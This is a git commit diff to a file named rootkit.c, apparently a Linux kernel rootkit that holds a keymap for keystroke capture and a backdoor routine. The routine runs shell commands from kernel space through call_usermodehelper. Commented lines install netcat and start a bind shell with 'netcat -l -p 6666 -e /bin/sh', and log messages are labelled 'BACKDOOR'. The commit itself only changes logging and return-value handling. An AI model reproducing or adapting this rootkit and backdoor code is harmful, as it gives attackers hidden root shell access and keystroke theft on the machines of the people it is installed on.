8c1e7cc14a5b933e0818fcdab164388c317e16bb
Michael Fröwis <mfrowis@localhost.localdomain>
2016-01-06 19:41:04 +0100

    bla

--- rootkit.c
+++ rootkit.c
@@ -142,17 +142,17 @@ static const char* keymap_shift[] =
 	    //char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
 	    //char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
 
-	    int ret = call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); // Remove all netcat version
+	    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); // Remove all netcat version
 	    #ifdef LOG
-			printk(KERN_ERR  "BACKDOOR un-install netcat returned  %i\n", ret);
+			//printk(KERN_ERR  "BACKDOOR un-install netcat returned  %i\n", ret);
 		#endif
 	    //ret = call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
 	    #ifdef LOG
-			printk(KERN_ERR  "BACKDOOR install netcat returned  %i\n", ret);
+			//printk(KERN_ERR  "BACKDOOR install netcat returned  %i\n", ret);
 		#endif
 	    //ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); // Launch netcat the fisrt time
 	    #ifdef LOG
-			printk(KERN_ERR  "BACKDOOR run netcat returned  %i\n", ret);
+			//printk(KERN_ERR  "BACKDOOR run netcat returned  %i\n", ret);
 		#endif
 	}
 
